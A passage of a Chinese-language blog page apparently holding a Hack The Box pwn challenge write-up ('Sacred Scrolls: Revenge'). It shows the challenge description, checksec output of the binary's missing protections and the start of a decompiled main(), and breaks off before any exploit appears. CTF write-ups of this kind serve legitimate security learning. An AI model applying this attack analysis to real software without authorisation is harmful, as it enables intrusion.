<!doctype html><html lang=zh-Hant-TW><head><link rel=preload href=/%20lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/%20lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/%20lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/%20lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous><script type=text/javascript src=https://latest.cactus.chat/cactus.js></script><link rel=stylesheet href=https://latest.cactus.chat/style.css type=text/css><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>【HTB Challenge】Sacred Scrolls: Revenge | ErrorPro</title>
<link rel=canonical href=https://ja-errorpro.codes/posts/HTB/Sacred-Scrolls-Revenge/><meta name=description content="我覺得現在在看這句話的人超電"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:url" content="https://ja-errorpro.codes/posts/HTB/Sacred-Scrolls-Revenge/"><meta property="og:site_name" content="ErrorPro"><meta property="og:title" content="【HTB Challenge】Sacred Scrolls: Revenge"><meta property="og:description" content="【HTB Challenge】Sacred Scrolls: Revenge Description Each house of the campus has its own secret library to store spells or spellbound messages so the others cannot see them. Messages are encrypted and must be signed by the boy who lived, turning them into sacred scrolls, otherwise they are not accepted in this library. You can try it yourself as long as you are a wizard of this house.
Checksec 1 2 3 4 5 6 7 "><meta property="og:locale" content="zh_Hant_TW"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-05T00:00:00+08:00"><meta property="article:modified_time" content="2024-03-05T00:00:00+08:00"><meta property="article:tag" content="Ctf"><meta name=twitter:card content="summary"><meta name=twitter:title content="【HTB Challenge】Sacred Scrolls: Revenge"><meta name=twitter:description content="【HTB Challenge】Sacred Scrolls: Revenge Description Each house of the campus has its own secret library to store spells or spellbound messages so the others cannot see them. Messages are encrypted and must be signed by the boy who lived, turning them into sacred scrolls, otherwise they are not accepted in this library. You can try it yourself as long as you are a wizard of this house.
Checksec 1 2 3 4 5 6 7 "><link rel=stylesheet href=https://ja-errorpro.codes/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N+XoIuZg=="><link rel=stylesheet href=https://ja-errorpro.codes/css/highlight.css><link rel=stylesheet href=https://ja-errorpro.codes/css/style-dark.css><link rel=stylesheet href=https://ja-errorpro.codes/css/search.css><link rel=stylesheet href=https://ja-errorpro.codes/css/cursor.css><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=https://ja-errorpro.codes/images/favicon.ico><script async src="https://www.googletagmanager.com/gtag/js?id=G-LP899FV1TS"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-LP899FV1TS")</script></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick='$("html, body").animate({scrollTop:0},"fast")' style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu><span id=nav><ul><li><a href=/>主頁</a></li><li><a href=/posts>廢文區</a></li><li><a href=/resources>資源</a></li><li><a href=/tags>標籤</a></li><li><a href=/comment>留言區</a></li><li><a href=/about>關於本人</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=https://ja-errorpro.codes/posts/2023/ctf_heap/ aria-label=Previous><i class="fas fa-chevron-left" aria-hidden=true onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class=icon href=https://ja-errorpro.codes/posts/2024/metasploitable3_writeup/ aria-label=Next><i class="fas fa-chevron-right" aria-hidden=true onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up" aria-hidden=true onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class=icon href=# aria-label=Share><i class="fas fa-share-alt" aria-hidden=true onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f" aria-label=Facebook><i class="fab fa-facebook" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&text=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge" aria-label=Twitter><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&title=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge" aria-label=Linkedin><i class="fab fa-linkedin" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&is_video=false&description=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge" aria-label=Pinterest><i class="fab fa-pinterest" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge&body=Check out this article: https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f" aria-label=Email><i class="fas fa-envelope" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&title=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge" aria-label=Pocket><i class="fab fa-get-pocket" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&title=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge" aria-label=reddit><i class="fab fa-reddit" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&name=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge&description=%3ch1%20id%3d%22htb-challengesacred-scrolls-revenge%22%3e%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge%3c%2fh1%3e%0a%3ch2%20id%3d%22description%22%3eDescription%3c%2fh2%3e%0a%3cp%3eEach%20house%20of%20the%20campus%20has%20its%20own%20secret%20library%20to%20store%20spells%20or%20spellbound%20messages%20so%20the%20others%20cannot%20see%20them.%20Messages%20are%20encrypted%20and%20must%20be%20signed%20by%20the%20boy%20who%20lived%2c%20turning%20them%20into%20sacred%20scrolls%2c%20otherwise%20they%20are%20not%20accepted%20in%20this%20library.%20You%20can%20try%20it%20yourself%20as%20long%20as%20you%20are%20a%20wizard%20of%20this%20house.%3c%2fp%3e%0a%3ch2%20id%3d%22checksec%22%3eChecksec%3c%2fh2%3e%0a%3cdiv%20class%3d%22highlight%22%3e%3cdiv%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23282a36%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%0a%3ctable%20style%3d%22border-spacing%3a0%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%22%3e%3ctr%3e%3ctd%20style%3d%22vertical-align%3atop%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%22%3e%0a%3cpre%20tabindex%3d%220%22%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23282a36%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%3ccode%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e1%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e2%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e3%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e4%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e5%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e6%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e7%0a%3c%2fspan%3e%3c%2fcode%3e%3c%2fpr" aria-label=Tumblr><i class="fab fa-tumblr" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fja-errorpro.codes%2fposts%2fHTB%2fSacred-Scrolls-Revenge%2f&t=%e3%80%90HTB%20Challenge%e3%80%91Sacred%20Scrolls%3a%20Revenge" aria-label="Hacker News"><i class="fab fa-hacker-news" aria-hidden=true></i></a></li></ul></div><div id=toc><nav id=TableOfContents><ul><li><a href=#description>Description</a></li><li><a href=#checksec>Checksec</a></li><li><a href=#analysis>Analysis</a><ul><li><a href=#upload>upload()</a></li><li><a href=#read>read()</a></li><li><a href=#save>save()</a></li></ul></li><li><a href=#exploit>Exploit</a></li><li><a href=#solution>Solution</a></li></ul></nav></div></span></div><article class=post itemscope itemtype=http://schema.org/BlogPosting><header><h1 class=posttitle itemprop="name headline">【HTB Challenge】Sacred Scrolls: Revenge</h1><div class=meta><div class=postdate><time datetime="2024-03-05 00:00:00 +0800 CST" itemprop=datePublished>2024-03-05</time></div><div class=article-tag><i class="fas fa-tag"></i>
<a class=tag-link href=/tags/ctf rel=tag>ctf</a></div></div></header><div class=content itemprop=articleBody><h1 id=htb-challengesacred-scrolls-revenge>【HTB Challenge】Sacred Scrolls: Revenge</h1><h2 id=description>Description</h2><p>Each house of the campus has its own secret library to store spells or spellbound messages so the others cannot see them. Messages are encrypted and must be signed by the boy who lived, turning them into sacred scrolls, otherwise they are not accepted in this library. You can try it yourself as long as you are a wizard of this house.</p><h2 id=checksec>Checksec</h2><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> <span style=color:#f1fa8c>&#39;/home/err0rpro/CTFLab/Hackthebox/SacredScrollsRevenge/sacred_scrolls&#39;</span>
</span></span><span style=display:flex><span>    Arch:     amd64-64-little
</span></span><span style=display:flex><span>    RELRO:    Full RELRO
</span></span><span style=display:flex><span>    Stack:    No canary found
</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#ff79c6>(</span>0x400000<span style=color:#ff79c6>)</span>
</span></span><span style=display:flex><span>    RUNPATH:  b<span style=color:#f1fa8c>&#39;./glibc/&#39;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=analysis>Analysis</h2><p>丟到 IDA 分析程式碼</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">89
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#ff79c6>__cdecl</span> __noreturn <span style=color:#50fa7b>main</span>(<span style=color:#8be9fd>int</span> argc, <span style=color:#ff79c6>const</span> <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>**</span>argv, <span style=color:#ff79c6>const</span> <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>**</span>envp)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#8be9fd>void</span> <span style=color:#ff79c6>*</span>v3; <span style=color:#6272a4>// rsp
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> command; <span style=color:#6272a4>// rax
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> <span style=color:#ff79c6>*</span>file_input; <span style=color:#6272a4>// rax
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v6; <span style=color:#6272a4>// rcx
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v7; <span style=color:#6272a4>// rcx
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v8; <span style=color:#6272a4>// rcx
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v9; <span style=color:#6272a4>// rcx
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v10; <span style=color:#6272a4>// rcx
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v11; <span style=color:#6272a4>// rcx
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v12; <span style=color:#6272a4>// rcx
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v13; <span style=color:#6272a4>// rcx
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v14; <span style=color:#6272a4>// rcx
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v15; <span style=color:#6272a4>// rcx
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v16; <span style=color:#6272a4>// rcx
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v17; <span style=color:#6272a4>// rcx
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> wizard_tag[<span style=color:#bd93f9>25</span>]; <span style=color:#6272a4>// [rsp+0h] [rbp-100h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#8be9fd>void</span> <span style=color:#ff79c6>*</span>buf; <span style=color:#6272a4>// [rsp+C8h] [rbp-38h]
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#ff79c6>__int64</span> v20; <span style=color:#6272a4>// [rsp+D0h] [rbp-30h]
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>  <span style=color:#8be9fd>int</span> v21; <span style=color:#6272a4>// [rsp+DCh] [rbp-24h]
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>setup</span>(argc, argv, envp);
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>banner</span>();
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>clean</span>();
</span></span><span style=display:flex><span>  <span style=color:#50fa7b>printf</span>(<span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>Enter your wizard tag: &#34;</span>);
</span></span><span style=display:flex><span>  v21 <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1536</span>;
</span></span><span style=display:flex><span>  v20 <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>1535LL</span>;
</span></span><span style=display:flex><span>  v3 <span style=color:#ff79c6>=</span> <span style=color:#50fa7b>alloca</span>(<span style=color:#bd93f9>1536LL</span>);
